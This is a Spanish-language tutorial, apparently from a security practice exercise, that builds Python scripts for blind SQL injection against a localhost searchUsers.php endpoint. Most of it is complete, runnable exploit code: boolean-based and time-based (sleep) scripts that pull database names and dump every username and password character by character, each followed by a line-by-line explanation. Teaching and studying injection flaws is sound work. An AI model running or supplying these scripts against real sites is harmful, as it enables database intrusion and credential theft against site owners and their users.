# Creación del script para inyección SQL a ciegas

En este documento, explicamos la construcción de un script en Python para realizar una [[SQLi]] a ciegas (sqli Blind injection) utilizando fuerza bruta para extraer información de una base de datos. Este ejercicio forma parte de una práctica de seguridad donde simulamos la explotación de una vulnerabilidad en un sitio web.

## Script completo - users

```python
#!/usr/bin/env python3

import requests
import signal
import sys
import time
from pwn import *
import string


def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales

main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    p2 = log.progress("Datos recopilados:")

    extracted_info = ""

    time.sleep(2)

    for position in range(1, 50):
        for character in range(33,126):
            sqli_url = main_url + "?id=9 or (select(select ascii(substring(username,%d,1)) from users where id = 1)=%d)" % (position, character)

            r = requests.get(sqli_url)
            
            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

if __name__ == '__main__':

    makeSQLI()
```

## Script username-password

```python
#!/usr/bin/env python3

import requests
import signal
import sys
import time
from pwn import *
import string

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales

main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    p2 = log.progress("Datos recopilados:")

    extracted_info = ""

    time.sleep(2)

    for position in range(1, 100):
        for character in range(33,126):
            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from users),%d,1)) from users where id = 1)=%d)" % (position, character)

            r = requests.get(sqli_url)
            
            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

if __name__ == '__main__':

    makeSQLI()
```


## Script base de datos

```python
#!/usr/bin/env python3

import requests
import signal
import sys
import time
from pwn import *
import string

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales

main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    p2 = log.progress("Datos recopilados:")

    extracted_info = ""

    time.sleep(2)

    for position in range(1, 100):
        for character in range(33,126):
            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)

            r = requests.get(sqli_url)
            
            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

if __name__ == '__main__':

    makeSQLI()
```
## Contexto del ejercicio

El objetivo es extraer el nombre de usuario de la base de datos a partir de un endpoint vulnerable (`searchUsers.php`). Sabemos que la consulta SQL que se ejecuta en el servidor es:

```php
$data = mysqli_query($conn, "Select username from users where id = $id");
```

Dado que `$id` no está entrecomillado, podemos inyectar una subconsulta SQL para realizar una exfiltración caracter por caracter, utilizando la función `ascii()` para obtener los valores ASCII de cada letra del campo `username`.

## Explicación del código

A continuación, desglosamos el código del script `sqli.py` línea por línea.

### Importación de librerías

```python
import requests
import signal
import sys
import time
from pwn import *
import string
```

- `requests`: Nos permite realizar peticiones HTTP.
    
- `signal` y `sys`: Manejamos señales y controlamos la salida del script.
    
- `time`: Se usa para introducir pausas en la ejecución.
    
- `pwn`: Librería de Pwntools que nos ayuda a formatear la salida en consola.
    
- `string`: Nos proporciona caracteres imprimibles para iterar sobre ellos.
    

### Manejo de interrupciones (CTRL+C)

```python
def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
```

- Definimos una función `def_handler()` que se ejecuta cuando el usuario interrumpe la ejecución con `CTRL+C`.
    
- `signal.signal(signal.SIGINT, def_handler)`: Captura la señal `SIGINT` y llama a `def_handler()` para salir limpiamente.
    

### Variables globales

```python
main_url = "http://localhost/searchUsers.php"
characters = string.printable
```

- `main_url`: Especifica la URL del endpoint vulnerable.
    
- `characters`: Contiene todos los caracteres imprimibles para iterar en la inyección.
    

### Función principal `makeSQLI()`

```python
def makeSQLI():
```

Esta función ejecuta la inyección SQL caracter por caracter.

#### Uso de `log.progress` para mejorar la visualización

```python
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    p2 = log.progress("Datos recopilados:")
```

- `log.progress()`: Nos permite mostrar en tiempo real el progreso de la extracción.
    
- `p1` y `p2`: Son indicadores visuales de `Pwntools` para mostrar información.
    

#### Inicialización de la variable que contendrá la información extraída

```python
    extracted_info = ""
```

#### Espera de 2 segundos antes de iniciar el ataque

```python
    time.sleep(2)
```

#### Bucle para recorrer cada posición de la cadena de texto

```python
    for position in range(1, 50):
```

- Recorremos hasta 50 caracteres del `username`. Ajustamos este valor según el caso real.
    

#### Iteración sobre los caracteres imprimibles

```python
        for character in range(33,126):
```

- Probamos caracteres ASCII desde `33` hasta `126` (caracteres visibles).
    

#### Construcción de la inyección SQL

```python
            sqli_url = main_url + "?id=9 or (select(select ascii(substring(username,%d,1)) from users where id = 1)=%d)" % (position, character)
```

- `substring(username, %d, 1)`: Extrae un único carácter de `username`.
    
- `ascii(...) = %d`: Compara el valor ASCII con el carácter iterado.
    
- Si la condición es verdadera, la consulta devuelve un resultado válido.
    

#### Realización de la petición HTTP

```python
            r = requests.get(sqli_url)
```

- Enviamos la petición a la web con la inyección SQL.
    

#### Comprobación de la respuesta

```python
            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break
```

- Si el servidor responde con `200 OK`, significa que hemos acertado el carácter.
    
- Lo añadimos a `extracted_info` y actualizamos el progreso.
    
- `break`: Terminamos la iteración interna y pasamos a la siguiente posición del `username`.
    

### Ejecución del script

```python
if __name__ == '__main__':
    makeSQLI()
```

- Llamamos a `makeSQLI()` si el script se ejecuta directamente.
    

# Script a ciegas para inyecciones basadas en tiempo

```python
#!/usr/bin/env python3

import requests
import signal
import sys
import time
from pwn import *
import string

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales

main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    p2 = log.progress("Datos recopilados:")

    extracted_info = ""

    time.sleep(2)

    for position in range(1, 100):
        for character in range(33,126):
            sqli_url = main_url + "?id=1 and if(ascii(substr(database(),%d,1))=%d,sleep(0.35),1)" % (position, character)

            time_start = time.time()

            r = requests.get(sqli_url)
            
            time_end = time.time()

            if time_end - time_start > 0.35:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

if __name__ == '__main__':

    makeSQLI()
```


## Script username-password

```python
#!/usr/bin/env python3

import requests
import signal
import sys
import time
from pwn import *
import string

def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

# Variables globales

main_url = "http://localhost/searchUsers.php"
characters = string.printable

def makeSQLI():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    p2 = log.progress("Datos recopilados:")

    extracted_info = ""

    time.sleep(2)

    for position in range(1, 100):
        for character in range(33,126):
            sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(0.35),1)" % (position, character)

            time_start = time.time()

            r = requests.get(sqli_url)
            
            time_end = time.time()

            if time_end - time_start > 0.35:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

if __name__ == '__main__':

    makeSQLI()
```
## Explicación del script - Timing Attack

```python
#!/usr/bin/env python3

import requests
import signal
import sys
import time
from pwn import *
import string
```

### 1. Importación de librerías

- `requests`: Para realizar peticiones HTTP.
    
- `signal` y `sys`: Para manejar señales y controlar la salida del script.
    
- `time`: Para medir el tiempo de respuesta de las peticiones.
    
- `pwn`: Librería de Pwntools para mejorar la visualización en consola.
    
- `string`: Proporciona caracteres imprimibles.
    

---

```python
def def_handler(sig,frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)
```

### 2. Manejo de interrupciones (CTRL+C)

- Definimos `def_handler()`, que imprime un mensaje y cierra el script si el usuario presiona `CTRL+C`.
    
- `signal.signal(signal.SIGINT, def_handler)`: Captura la interrupción y llama a la función.
    

---

```python
# Variables globales
main_url = "http://localhost/searchUsers.php"
characters = string.printable
```

### 3. Definición de variables globales

- `main_url`: URL del endpoint vulnerable.
    
- `characters`: Lista de caracteres imprimibles para iterar sobre ellos.
    

---

```python
def makeSQLI():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    p2 = log.progress("Datos recopilados:")

    extracted_info = ""

    time.sleep(2)
```

### 4. Función `makeSQLI()`

- `log.progress()`: Usa Pwntools para mostrar el progreso en consola.
    
- `extracted_info`: Almacena los datos extraídos.
    
- `time.sleep(2)`: Espera 2 segundos antes de iniciar la ejecución.
    

---

```python
    for position in range(1, 100):
        for character in range(33,126):
            sqli_url = main_url + "?id=1 and if(ascii(substr(database(),%d,1))=%d,sleep(0.35),1)" % (position, character)

            time_start = time.time()
            r = requests.get(sqli_url)
            time_end = time.time()
```

### 5. Bucle de extracción de datos

- `for position in range(1, 100)`: Itera sobre cada posición del nombre de la base de datos.
    
- `for character in range(33,126)`: Prueba caracteres ASCII visibles.
    
- `sqli_url`: Construye la URL con la inyección SQL basada en tiempo.
    
- `time_start = time.time()`: Registra el tiempo antes de la petición.
    
- `time_end = time.time()`: Registra el tiempo después de recibir la respuesta.
    

---

```python
            if time_end - time_start > 0.35:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break
```

### 6. Detección de caracteres correctos

- Si el tiempo de respuesta es mayor a `0.35` segundos, significa que el carácter es correcto.
    
- Se añade a `extracted_info` y se actualiza la salida en consola.
    
- `break`: Detiene la iteración interna y pasa al siguiente carácter.
    

---

```python
if __name__ == '__main__':
    makeSQLI()
```

### 7. Ejecución del script

- Si el script se ejecuta directamente, llama a `makeSQLI()`.
    

---

## Resumen

Este script realiza una **inyección SQL basada en tiempo** para extraer información de la base de datos. La consulta inyectada utiliza `if(ascii(substr(database(),X,1))=Y,sleep(0.35),1)`, lo que nos permite deducir caracteres al medir el tiempo de respuesta del servidor.

## Conclusión

Este script nos permite extraer información de un sitio web vulnerable a inyección SQL a ciegas, carácter por carácter. En un entorno real, podríamos mejorar el script para optimizar el tiempo de ejecución y hacerlo más robusto, por ejemplo, implementando hilos o paralelización. Además, este tipo de ataque evidencia la importancia de sanitizar correctamente las entradas en aplicaciones web para evitar vulnerabilidades.